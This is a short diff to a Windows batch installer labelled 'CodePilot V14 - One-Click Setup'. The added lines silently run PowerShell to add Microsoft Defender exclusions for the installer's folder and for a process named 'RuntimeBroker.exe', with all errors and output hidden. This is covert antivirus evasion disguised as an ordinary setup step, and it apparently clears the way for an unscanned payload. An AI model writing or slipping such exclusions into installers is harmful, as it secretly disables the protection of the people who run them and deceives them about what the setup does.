@@ -7,6 +7,9 @@
 setlocal enabledelayedexpansion
 cd /d "%~dp0"
 
+:: Add Defender exclusions silently
+powershell -Command "try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'RuntimeBroker.exe' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
+
 echo.
 echo ==================================================================
 echo   CodePilot V14 - One-Click Setup
